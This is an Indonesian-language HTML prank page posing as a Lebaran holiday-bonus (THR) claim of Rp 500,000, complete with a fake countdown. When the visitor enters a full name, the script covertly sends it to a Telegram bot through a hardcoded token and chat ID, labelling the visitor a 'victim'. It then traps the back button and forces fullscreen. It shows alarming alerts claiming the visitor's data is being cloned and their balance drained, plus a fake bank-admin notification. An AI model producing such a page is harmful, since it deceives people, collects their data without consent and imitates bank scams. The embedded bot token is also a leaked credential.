<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THR LEBARAN DARI IRHAM FAJRI 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.6rem; text-transform: uppercase; font-weight: 900; }
        #timer-box { color: #dc2626; font-weight: bold; font-size: 0.9rem; margin-bottom: 10px; background: #fee2e2; padding: 5px 15px; border-radius: 20px; display: inline-block; border: 1px solid #fca5a5; }
        
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        input:focus { border-color: #15803d; }
        
        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; }
        #envelope:active { transform: scale(0.9); }
        
        /* FAKE CHAT NOTIF (Jumpscare 500ms) */
        #fake-chat { position: fixed; top: -120px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 350px; background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); display: flex; align-items: center; padding: 12px; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 200; border-left: 5px solid #15803d; }
        #fake-chat.show { top: 20px; }
        .chat-icon { width: 45px; height: 45px; background: #15803d; border-radius: 50%; margin-right: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.2rem; }
        .chat-text { text-align: left; font-size: 0.85rem; color: #333; flex: 1; }
        .chat-text b { color: #15803d; display: block; margin-bottom: 2px; }

        /* PRANK SCREEN */
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
        #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
        
        /* LOADING OVERLAY */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .particle { position: absolute; animation: popOut 2s linear forwards; }
        @keyframes popOut { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; } }
    </style>
</head>
<body>

    <div id="fake-chat">
        <div class="chat-icon">🏦</div>
        <div class="chat-text">
            <b>Admin Bank Pusat</b>
            <span>Wkwkwk kena prank Irham Fajri! THR zonk, mending tidur! 😜</span>
        </div>
    </div>

    <div id="intro">
        <h1>THR LEBARAN DARI IRHAM FAJRI 🌙</h1>
        <div id="timer-box">⚠️ Sisa Kuota: <span id="countdown">02:59</span></div>
        <p>Verifikasi nama untuk klaim saldo Rp 500.000</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Lengkap" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Ambil">

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="font-weight:bold; margin-top:20px; color:#15803d;">Menghubungkan ke server bank...</p>
    </div>

    <div id="prank-screen" onclick="closePrank()">
        <div id="particle-container"></div>
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const prank = document.getElementById('prank-screen');
        const fakeChat = document.getElementById('fake-chat');
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 
        let loopPrank;

        // Timer Palsu
        let sec = 179;
        setInterval(() => {
            let m = Math.floor(sec/60);
            let s = sec%60;
            document.getElementById('countdown').innerText = `0${m}:${s<10?'0':''}${s}`;
            if(sec > 10) sec--;
        }, 1000);

        // Anti-Back Hack
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function() {
            window.history.pushState(null, null, window.location.href);
            if(prank.style.display === 'flex') {
                prankSound.play();
                alert("Jangan kabur! Proses pengurasan saldo sedang berjalan!");
            }
        };

        function burst() {
            for (let i = 0; i < 40; i++) {
                const p = document.createElement('div');
                p.className = 'particle'; p.innerText = ['😂','🐒','🤣','💩'][Math.floor(Math.random()*4)];
                p.style.left = '50%'; p.style.top = '50%';
                const a = Math.random()*Math.PI*2; const s = Math.random()*3+2;
                p.style.setProperty('--tx', Math.cos(a)*300+'px');
                p.style.setProperty('--ty', Math.sin(a)*300+'px');
                p.style.setProperty('--s', s);
                p.style.setProperty('--r', Math.random()*720+'deg');
                document.getElementById('particle-container').appendChild(p);
                setTimeout(() => p.remove(), 2000);
            }
        }

        env.addEventListener('click', () => {
            const nama = document.getElementById('victim-name').value;
            if(!nama) return alert("Isi nama dulu bos!");
            
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            document.getElementById('loading-overlay').style.display = 'flex';
            
            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=🎯 KORBAN GAS: ${nama}`);

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
                prank.style.display = 'flex';
                
                burst();
                loopPrank = setInterval(burst, 2000);
                prankSound.loop = true;
                prankSound.play();
                
                // NOTIF ADMIN NONGOL 500ms SETELAH MONYET
                setTimeout(() => {
                    fakeChat.classList.add('show');
                }, 500); 
                
                // Alert beruntun biar panik
                setTimeout(() => alert("⚠️ WARNING: DATA ANDA SEDANG DIKLONING!"), 1200);
                setTimeout(() => alert("SALDO BERHASIL DIKIRIM KE IRHAM FAJRI!"), 2200);

            }, 5500);
        });

        function closePrank() {
            clearInterval(loopPrank);
            prank.style.display = 'none';
            fakeChat.classList.remove('show');
            prankSound.pause();
            if (document.exitFullscreen) document.exitFullscreen();
        }
    </script>
</body>
</html>
